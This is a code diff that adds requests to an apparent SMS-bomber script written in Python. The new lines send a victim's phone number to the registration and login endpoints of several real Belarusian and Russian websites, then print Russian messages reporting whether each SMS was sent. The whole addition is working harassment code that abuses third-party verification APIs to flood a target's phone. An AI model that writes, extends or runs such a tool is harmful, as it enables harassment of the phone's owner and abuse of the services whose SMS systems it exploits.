@@ -240,3 +240,36 @@ if response.status_code == 200:
     print(Fore.GREEN +"Смс от detmir отправлено!")
 else:
     print('\033[31m'+"Смс от detmir не отправлено!")
+
+
+dates = {
+    "component": "bxmaker.authuserphone.login",
+    "sessid": "ef6505cf50385cada164056d347fc483",
+    "method": "sendCode",
+    "phone": f"{phone}",
+    "registration": "Y"
+}
+
+response = requests.post('https://xn----7sblod1blc5h.xn--90ais/user/#registration', data=dates, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от detmir отправлено!")
+else:
+    print(Fore.RED + "Смс от detmir не отправлено!")
+
+
+response = requests.post('https://users-service.atlantm.by/api/auth/login', json={"phone":f"{phone}"}, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от atlantm отправлено!")
+else:
+    print(Fore.RED + "Смс от atlantm не отправлено!")
+
+
+dates = {
+    "PHONE": f"{phone}"
+}
+
+response = requests.post('https://mila.by/local/gtools/register/check.php', data=dates, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от mila отправлено!")
+else:
+    print(Fore.RED + "Смс от mila не отправлено!")
